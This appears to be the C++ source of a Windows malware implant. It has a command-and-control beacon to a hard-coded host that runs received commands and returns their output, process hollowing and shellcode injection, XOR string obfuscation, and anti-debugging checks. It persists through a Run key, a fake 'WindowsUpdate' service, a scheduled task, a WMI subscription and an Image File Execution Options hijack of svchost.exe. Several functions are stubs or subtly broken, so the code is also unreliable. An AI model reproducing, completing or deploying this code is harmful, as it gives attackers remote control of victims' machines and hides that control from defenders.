#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <iostream>
#include <thread>
#include <random>
#include <fstream>
#include <array>
#include <functional>
#include <chrono>
#include <cstdlib>
#include <intrin.h>
#include <memory>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <winhttp.h>
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "taskschd.lib")

// XOR Key and function declarations at the top
constexpr std::array<uint8_t, 16> XOR_KEY = { 0x5A, 0x23, 0xB2, 0x4C, 0x6F, 0x11, 0x9E, 0x85, 0xE3, 0x4E, 0x39, 0x8C, 0x1D, 0xF4, 0x65, 0x7C };

void xor_encrypt_decrypt(std::string& str, const std::array<uint8_t, 16>& key);
FARPROC resolve_syscall(const char* syscall_name);


// Obfuscation
#define OBFUSCATED_STRING(name, str) \
    const char name##_enc[] = str; \
    std::string name(name##_enc, sizeof(name##_enc) - 1); \
    xor_encrypt_decrypt(name, XOR_KEY);


// Typedefs
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

// Functions
DWORD GetProcessIdByName(const char* processName);
bool IsInsideVMWare();
bool IsInsideVirtualBox();
bool IsInsideHyperV();
bool DetectSandboxArtifacts();
bool DetectDebugger();
bool DetectEmulation();
bool TimingCheck();
bool CheckCPUFeatures();
bool DetectMonitoringTools();
bool DetectHooks();
PVOID GetPEBAddress(HANDLE process);
PVOID GetPEBaseAddress(HANDLE process);
bool enhanced_anti_analysis();
void exit_handler();
extern "C" NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
void inject_into_process(const char* process_name, unsigned char* shellcode, size_t size);

// Anti-Analysis Functions
bool IsInsideVMWare() { return false; }
bool IsInsideVirtualBox() { return false; }
bool IsInsideHyperV() { return false; }
bool DetectSandboxArtifacts() { return false; }
bool DetectDebugger() { return false; }
bool DetectEmulation() { return false; }
bool TimingCheck() { return false; }
bool CheckCPUFeatures() { return false; }
bool DetectMonitoringTools() { return false; }
bool DetectHooks() { return false; }

// Process Functions
DWORD GetProcessIdByName(const char* processName) { return 0; }
PVOID GetPEBAddress(HANDLE process) { return nullptr; }
PVOID GetPEBaseAddress(HANDLE process) { return nullptr; }

// First declare the classes
class Persistence {
public:
    void install_multiple_persistence();
    void add_registry_run();
    void create_service();
private:
    std::string current_path;
    void install_scheduled_task();
    void create_wmi_subscription();
    void modify_image_file_execution();
    bool verify_privileges();
    void cleanup_handles(SC_HANDLE hService, SC_HANDLE hSCManager);
};
class C2Channel {
public:
    void beacon();
private:
    std::string current_domain;
    std::vector<std::string> generate_dga();
    bool check_connectivity(const std::string& domain);
    void send_encrypted_data(const std::string& data);
    int random_jitter(int min, int max);
    std::string gather_system_info();
    std::string receive_command();
    std::string execute_command(const std::string& cmd);
    void send_response(const std::string& response);
    std::string get_data_from_server();
    std::string decrypt_data(const std::string& encrypted_data);
};

class NetworkManager {
public:
    bool initialize();
    bool send_beacon();
    std::vector<uint8_t> receive_command();
    bool send_response(const std::vector<uint8_t>& data);
private:
    std::string hostname;
    std::string username;
    std::string domain;
    DWORD pid;
    std::vector<std::string> running_processes;
};

// C2 Channel Implementation
void C2Channel::beacon() {
    while(true) {
    // Check if c2 is accessible
    if (!check_connectivity("http://192.168.1.37:8080")) {
        continue;
    }
    // Heartbeat and check for commands
        std::string command = receive_command();
        if (!command.empty()) {
            std::string response = execute_command(command);
            send_response(response);
        }
        
        std::this_thread::sleep_for(
            std::chrono::seconds(random_jitter(300, 900))
        );
    }
}
std::string C2Channel::receive_command() {
    // Connect to C2 server
    if (!check_connectivity("http://192.168.1.37:8080")) {
        return "";
    }

    // Get encrypted command from C2 server
    std::string encrypted_data = get_data_from_server();

    // Decrypt and validate command
    if (encrypted_data.empty()) {
        return "";
    }
    return decrypt_data(encrypted_data);
}
std::string C2Channel::execute_command(const std::string& cmd) {
    std::string output;
    
    // Create pipe for command execution
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Failed to create pipe";
    }

    // Create process for command execution
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        
        // Read command output
        char buffer[4096];
        DWORD bytesRead;
        
        while (ReadFile(hReadPipe, buffer, sizeof(buffer)-1, &bytesRead, NULL)) {
            if (bytesRead == 0) break;
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);

    return output;
}
 int C2Channel::random_jitter(int min, int max) {
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dis(min, max);
     return dis(gen);
 }

// Add NtFreeVirtualMemory declaration
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

// Process Hollowing
void process_hollow(const char* target_process, unsigned char* shellcode, size_t shellcode_size) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    DWORD creation_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    
    if (!CreateProcessA(target_process, NULL, NULL, NULL, FALSE, creation_flags, NULL, NULL, &si, &pi)) {
        return;
    }

    OBFUSCATED_STRING(ntalloc, "NtAllocateVirtualMemory");
    OBFUSCATED_STRING(ntprotect, "NtProtectVirtualMemory");
    OBFUSCATED_STRING(ntwrite, "NtWriteVirtualMemory");
    OBFUSCATED_STRING(ntfree, "NtFreeVirtualMemory");

    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)resolve_syscall(ntalloc.c_str());
    auto NtProtectVirtualMemory = (NtProtectVirtualMemory_t)resolve_syscall(ntprotect.c_str());
    auto NtWriteVirtualMemory = (NtWriteVirtualMemory_t)resolve_syscall(ntwrite.c_str());
    auto NtFreeVirtualMemory = (NtFreeVirtualMemory_t)resolve_syscall(ntfree.c_str());

    PVOID base_addr = NULL;
    SIZE_T region_size = shellcode_size;

    NTSTATUS status = NtAllocateVirtualMemory(
        pi.hProcess,
        &base_addr,
        0,
        &region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (NT_SUCCESS(status)) {
        NtWriteVirtualMemory(pi.hProcess, base_addr, shellcode, shellcode_size, NULL);
        NtFreeVirtualMemory(pi.hProcess, &base_addr, &region_size, MEM_RELEASE);
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

// XOR Encrypt/Decrypt
void xor_encrypt_decrypt(std::string& str, const std::array<uint8_t, 16>& key) {
    for (size_t i = 0; i < str.length(); i++) {
        str[i] ^= key[i % key.size()];
    }
}

// FNV-1a Hash Function
constexpr uint32_t fnv1a_hash(const char* str, uint32_t hash = 0x811c9dc5) {
    return *str ? fnv1a_hash(str + 1, (hash ^ static_cast<uint32_t>(*str)) * 0x01000193) : hash;
}

// Obfuscate String Macro
#define OBFUSCATED_STRING(name, str) \
    const char name##_enc[] = str; \
    std::string name(name##_enc, sizeof(name##_enc) - 1); \
    xor_encrypt_decrypt(name, XOR_KEY);

// Dynamic Syscall Resolver
FARPROC resolve_syscall(const char* syscall_name) {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) return nullptr;

    // Manually resolve syscall number from export table
    return GetProcAddress(ntdll, syscall_name);
}

// Direct Syscall Wrapper
extern "C" NTSTATUS NTAPI NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartAddress, PVOID Parameter,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PVOID AttributeList);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE,
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// Anti-Debugging
bool anti_debugger() {
    OBFUSCATED_STRING(debug_syscall, "NtQueryInformationProcess");

    typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
    auto NtQueryInformationProcess = (NtQueryInformationProcess_t)resolve_syscall(debug_syscall.c_str());
    if (!NtQueryInformationProcess) return false;

    PROCESS_BASIC_INFORMATION pbi;
    ULONG return_length = 0;

    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &return_length);

    return (status == 0x00000000 && pbi.InheritedFromUniqueProcessId == 0);
}

void Persistence::install_multiple_persistence() {
    if (!verify_privileges()) return;
    
    OBFUSCATED_STRING(reg_path, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    OBFUSCATED_STRING(svc_name, "WindowsUpdate");
    
    add_registry_run();
    create_service();
    install_scheduled_task();
    create_wmi_subscription();
    modify_image_file_execution();
}

void Persistence::add_registry_run() {
    HKEY hkey = nullptr;
    LSTATUS status = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hkey, NULL);
    
    if (status == ERROR_SUCCESS && hkey) {
        RegSetValueExA(hkey, "WindowsUpdate", 0, REG_SZ, 
            reinterpret_cast<const BYTE*>(current_path.c_str()), 
            static_cast<DWORD>(current_path.length() + 1));
        RegCloseKey(hkey);
    }
}

void Persistence::create_service() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return;

    DWORD dwDesiredAccess = SERVICE_ALL_ACCESS;
    SC_HANDLE hService = CreateServiceA(hSCManager, 
        "WindowsUpdate", // Service name
        "Windows System Update", // Display name
        dwDesiredAccess,
        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, // Service type
        SERVICE_AUTO_START, // Start type
        SERVICE_ERROR_NORMAL, // Error control
        current_path.c_str(), // Binary path
        NULL, // Load order group
        NULL, // Tag ID
        "RpcSs\0", // Dependencies
        NULL, // Service start name
        NULL  // Password
    );

    cleanup_handles(hService, hSCManager);
}

void Persistence::cleanup_handles(SC_HANDLE hService, SC_HANDLE hSCManager) {
    if (hService) CloseServiceHandle(hService);
    if (hSCManager) CloseServiceHandle(hSCManager);
}

bool Persistence::verify_privileges() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated != 0;
}
// Windows API Hooking
void hook_api(const char* api_name, FARPROC new_address) {
    FARPROC old_address = GetProcAddress(GetModuleHandleA(NULL), api_name);
    if (!old_address) return;
    
    DWORD old_protection;
    if (!VirtualProtect((LPVOID)old_address, 5, PAGE_EXECUTE_READWRITE, &old_protection)) 
        return;
        
    unsigned char jmp[] = {0xE9};
    UINT_PTR relative_addr = (UINT_PTR)new_address - (UINT_PTR)old_address - 5;
    
    memcpy((void*)old_address, jmp, 1);
    memcpy((void*)((UINT_PTR)old_address + 1), &relative_addr, 4);
    
    VirtualProtect((LPVOID)old_address, 5, old_protection, &old_protection);
}
// Windows CryptoAPI Encryption
void aes_encrypt(const std::string& data, std::string& encrypted) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }

    if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return;
    }

    std::vector<BYTE> buffer(data.begin(), data.end());
    DWORD encryptedLen = buffer.size();
    
    if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &encryptedLen, buffer.size())) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return;
    }

    encrypted = std::string(reinterpret_cast<char*>(buffer.data()), encryptedLen);
    
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
}

class FileOperations {
public:
    void secure_file_delete(const std::string& path);
};

// Send Data to C2
void send_data(const std::string& data) {
    OBFUSCATED_STRING(server_url, "http://192.168.1.37:8080");

    std::string encrypted_data;
    aes_encrypt(data, encrypted_data);

    typedef NTSTATUS(NTAPI* NtWriteFile_t)(
        HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);

    OBFUSCATED_STRING(ntwritefile, "NtWriteFile");
    auto NtWriteFile = (NtWriteFile_t)resolve_syscall(ntwritefile.c_str());

    if (!NtWriteFile) return;

    HANDLE hFile;
    OBJECT_ATTRIBUTES obj_attr = {};
    IO_STATUS_BLOCK io_status = {};

    UNICODE_STRING file_name;
    file_name.Buffer = (PWSTR)server_url.c_str();
    file_name.Length = server_url.size() * sizeof(wchar_t);
    file_name.MaximumLength = (server_url.size() + 1) * sizeof(wchar_t);

    obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
    obj_attr.ObjectName = &file_name;

    NtWriteFile(hFile, NULL, NULL, NULL, &io_status, (PVOID)encrypted_data.c_str(),
                encrypted_data.size(), NULL, NULL);
}

void agent_main() {
    if (anti_debugger() || enhanced_anti_analysis()) {
        exit_handler();
        return;
    }

    Persistence persist;
    persist.install_multiple_persistence();
    
    C2Channel c2;
    std::thread beacon_thread(&C2Channel::beacon, &c2);
    
    FileOperations fileops;
    // Continue with main operation loop
}

int main() {
    agent_main();
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
    return EXIT_SUCCESS;
}

void inject_into_process(const char* process_name, unsigned char* shellcode, size_t size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(process_name));
    
    OBFUSCATED_STRING(ntalloc, "NtAllocateVirtualMemory");
    OBFUSCATED_STRING(ntwrite, "NtWriteVirtualMemory");
    
    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)resolve_syscall(ntalloc.c_str());
    auto NtWriteVirtualMemory = (NtWriteVirtualMemory_t)resolve_syscall(ntwrite.c_str());

    PVOID base_addr = NULL;
    SIZE_T region_size = size;
    
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &base_addr,
        0,
        &region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (NT_SUCCESS(status)) {
        SIZE_T bytes_written;
        NtWriteVirtualMemory(
            hProcess,
            base_addr,
            shellcode,
            size,
            &bytes_written
        );
    }
}

// anti-debugging
    bool enhanced_anti_analysis() {
      // Check for virtualization
      if (IsInsideVMWare() || IsInsideVirtualBox() || IsInsideHyperV()) return true;
      // Check for analysis tools
      if (DetectSandboxArtifacts() || DetectDebugger() || DetectEmulation()) return true;
      // Check execution time and CPU characteristics
      if (TimingCheck() || CheckCPUFeatures()) return true;
      // Check for monitoring tools and DLL injection
      if (DetectMonitoringTools() || DetectHooks()) return true;
      return false;
  }

 void Persistence::install_scheduled_task() {
     STARTUPINFOA si = { sizeof(STARTUPINFOA) };
     PROCESS_INFORMATION pi;
     std::string cmd = "schtasks /create /tn \"Windows Update\" /tr \"" + current_path + "\" /sc onlogon /ru System";
     CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
 void Persistence::create_wmi_subscription() {
     std::string cmd = "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"WindowsUpdate\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"";
     system(cmd.c_str());
 }
 
 void Persistence::modify_image_file_execution() {
     HKEY hKey;
     RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe", 
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
     RegSetValueExA(hKey, "Debugger", 0, REG_SZ, (BYTE*)current_path.c_str(), current_path.length() + 1);
     RegCloseKey(hKey);
 }

void C2Channel::send_encrypted_data(const std::string& data) {
    std::string encrypted_data;
    aes_encrypt(data, encrypted_data);
    send_data(encrypted_data);
}

void C2Channel::send_response(const std::string& response) {
    send_encrypted_data(response);
}

bool C2Channel::check_connectivity(const std::string& domain) {
    HINTERNET hSession = WinHttpOpen(L"User Agent", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        WinHttpCloseHandle(hSession);
        return true;
    }
    return false;
}

std::string C2Channel::get_data_from_server() {
    HINTERNET hSession = WinHttpOpen(L"User Agent", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        WinHttpCloseHandle(hSession);
    }
    return "";
}

std::string C2Channel::decrypt_data(const std::string& encrypted_data) {
    std::string decrypted = encrypted_data;
    xor_encrypt_decrypt(decrypted, XOR_KEY);
    return decrypted;
}

void exit_handler() {
    ExitProcess(0);
}

